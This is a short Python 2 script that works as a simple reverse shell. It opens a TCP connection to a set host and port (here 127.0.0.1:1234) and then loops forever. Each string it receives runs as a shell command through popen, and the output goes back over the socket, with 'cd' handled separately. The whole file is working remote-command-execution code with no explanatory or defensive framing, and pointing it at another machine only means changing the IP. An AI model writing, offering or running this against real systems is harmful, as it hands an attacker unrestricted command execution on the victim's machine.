import socket
from os import popen
from os import chdir
import sys

TCP_IP = '127.0.0.1'
TCP_PORT = 1234
BUFFER_SIZE = 1024
MESSAGE = "Hello, World!"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

saveout = sys.stdout
fsock = open('out.log', 'w')
##sys.stdout = fsock
##sys.stderr = fsock

while (1):
    data = s.recv(BUFFER_SIZE)
    if (data[:3] == "cd "):
        chdir(data[3:len(data) - 1])
    else:
        ret = popen(data)
        s.send(ret.read())

s.close()
print "received data:", data
